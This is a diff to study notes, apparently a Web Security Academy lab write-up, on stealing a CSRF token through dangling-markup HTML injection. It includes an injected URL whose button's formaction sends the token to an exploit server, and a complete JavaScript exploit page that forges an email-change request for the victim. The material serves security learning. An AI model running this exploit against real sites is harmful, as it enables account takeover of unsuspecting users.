@@ -62,3 +62,63 @@ https://xxx.web-security-academy.net/my-account?id=wiener&email=%22%3E%3Ca%20hre
 ```
 
 - on clicking the link it will open the metallica.com and in the devtools type `window.name` -> "duck"
+
+> if the last `"` is removed from the url then it will give the `target` the value until it finds one to close it (maybe need to use a `'` instead)
+
+> this does not work anymore browsers got updated to fix that but there is another option
+
+## alternative solution
+
+```
+https://xxx.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-zzz.exploit-server.net/exploit" formmethod="get">Click me</button>
+```
+
+- the `formaction` attribute will override the form submit url
+- the `formmethod` attribute will override the form submit method type
+
+> this is the exploit that needs to be delivered to the victim:
+
+```
+<body>
+  <script>
+    const academyFrontend = "https://xxx.web-security-academy.net/";
+    const exploitServer = "https://yyy.exploit-server.net/exploit";
+
+    const url = new URL(location);
+    const csrf = url.searchParams.get("csrf");
+
+    if (csrf) {
+      const form = document.createElement("form");
+      const email = document.createElement("input");
+      const token = document.createElement("input");
+
+      token.name = "csrf";
+      token.value = csrf;
+
+      email.name = "email";
+      email.value = "hacker@evil-user.net";
+
+      form.method = "post";
+      form.action = `${academyFrontend}my-account/change-email`;
+      form.append(email);
+      form.append(token);
+
+      document.documentElement.append(form);
+      form.submit();
+    } else {
+      location = `${academyFrontend}my-account?email=blah@blah"><button class=button formaction=${exploitServer} formmethod=get type=submit>Click me</button>`;
+    }
+  </script>
+</body>
+```
+
+- `academyFrontend` is the site that the victim will visit
+- `exploitServer` is where the `csrf` will be sent
+
+> at first there is no `csrf` token so the `else` condition redirect the browser to that `url` where the click button triggers the exposer of the `csrf` token with a GET request
+
+> so on the click the victim sends the credentials to the exploit server and visits it the same time, the url has the `csrf` key so it forges a form with an emil change request and submits it
+
+> this only works if the `csrf` token and the session key is present on the submit, the session key is that the victim has in its browser
+
+- this exploit actually a two scripts merged together, the first part is the click me button exposure to the victim, and second part is the forge of form that actually does not needs to be sent to the victim it only needs to be in the exploit server, but this way it is a compact exploit
